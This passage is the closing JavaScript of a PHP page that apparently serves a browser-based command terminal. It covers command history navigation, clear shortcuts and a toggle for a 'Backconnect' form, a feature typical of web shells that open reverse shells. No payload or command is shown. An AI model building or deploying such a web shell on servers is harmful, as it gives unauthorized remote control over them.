        var termHistCmd = <?= json_encode(isset($termHist) ? array_map(function ($h) { return $h['cmd']; }, $termHist) : [], JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) ?>;
        var termIdx = termHistCmd.length;
        termInput.addEventListener('keydown', function (e) {
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (termHistCmd.length && termIdx > 0) { termIdx--; termInput.value = termHistCmd[termIdx]; }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (termIdx < termHistCmd.length) {
                    termIdx++;
                    termInput.value = termIdx < termHistCmd.length ? termHistCmd[termIdx] : '';
                }
            }
        });
        var termClear = document.getElementById('term-clear');
        termClear.addEventListener('click', function () {
            termInput.value = 'clear';
            termForm.submit();
        });
        /* Ctrl+L clears the terminal output (gecko-style) */
        termInput.addEventListener('keydown', function (ev) {
            if ((ev.ctrlKey || ev.metaKey) && ev.key.toLowerCase() === 'l') {
                ev.preventDefault();
                termInput.value = 'clear';
                termForm.submit();
            }
        });
        /* Backconnect form toggle */
        var bcBtn = document.getElementById('term-bc');
        var bcForm = document.getElementById('bc-form');
        if (bcBtn && bcForm) {
            bcBtn.addEventListener('click', function () {
                bcForm.style.display = (bcForm.style.display === 'none') ? 'flex' : 'none';
            });
        }
        if (termOut) termOut.scrollTop = termOut.scrollHeight;
    }
})();
</script>
</body>
</html>
